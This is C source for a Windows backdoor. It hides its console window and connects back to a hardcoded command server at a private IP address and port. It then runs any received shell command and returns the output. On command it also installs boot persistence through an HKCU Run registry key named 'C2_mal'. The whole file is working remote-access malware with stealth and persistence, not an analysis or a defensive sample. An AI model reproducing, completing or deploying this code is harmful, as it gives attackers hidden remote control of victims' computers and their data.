#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <Windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>


#define HIVESERVER "10.194.6.47"
#define HIVEPORT 57890

#define bzero(p, size) (void) memset(p, 0, size)

SOCKET sock;

char getSubString(char* buff, char* dest, int from, int to) {
	strncpy(dest, buff + from, to);
}

int bootRun() {
	char err[128] = "Failed\n";
	char suc[128] = "Created persistence At: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	
	if (pathLen == 0) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY newVal;

	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newVal) != ERROR_SUCCESS) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(newVal, TEXT("C2_mal"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(newVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	RegCloseKey(newVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}

void Shell() {
	char buffer[1024];
	char container[1024];
	char directory[1024];
	char total_response[16836];
	

	while (1) {
	jump:
		bzero(buffer, sizeof(buffer));
		bzero(directory, sizeof(directory));
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		
		recv(sock, buffer, sizeof(buffer), 0);

		if (strncmp("q", buffer, 1) == 0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (strncmp("cd ", buffer, 3) == 0) {
			getSubString(&buffer, &directory, 3, 100);
			_chdir(directory);
			strcpy(total_response, "changed\n");
			send(sock, total_response, sizeof(total_response), 0);
		}
		else if (strncmp("persist", buffer, 3) == 0) {
			bootRun();
		}
		else {
			FILE* fp;
			fp = _popen(buffer, "r");
			while (fgets(container, sizeof(container), fp) != NULL) { //check if resp can fit in 1024 bytes.
				strcat_s(total_response, sizeof(total_response), container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL); //Retrieve handle to the top level window.
	ShowWindow(stealth, 0); // Zero means hide the window.

	struct sockaddr_in SrvAddr;
	unsigned short SrvPort;
	char* SrvIP;
	WSADATA wsaData;
	SrvIP = HIVESERVER;
	SrvPort = HIVEPORT;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) { //First function to check and set winsock version.
		exit(1);
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0); //Define sock object.
	memset(&SrvAddr, 0, sizeof(SrvAddr)); //Clean sock object.

	SrvAddr.sin_family = AF_INET;
	inet_pton(AF_INET, SrvIP, &SrvAddr.sin_addr);
	SrvAddr.sin_port = htons(SrvPort);
	
	start:
	while (connect(sock, (struct sockaddr*) &SrvAddr, sizeof(SrvAddr)) != 0) {
		Sleep(10);
		goto start;
	}

	Shell();
}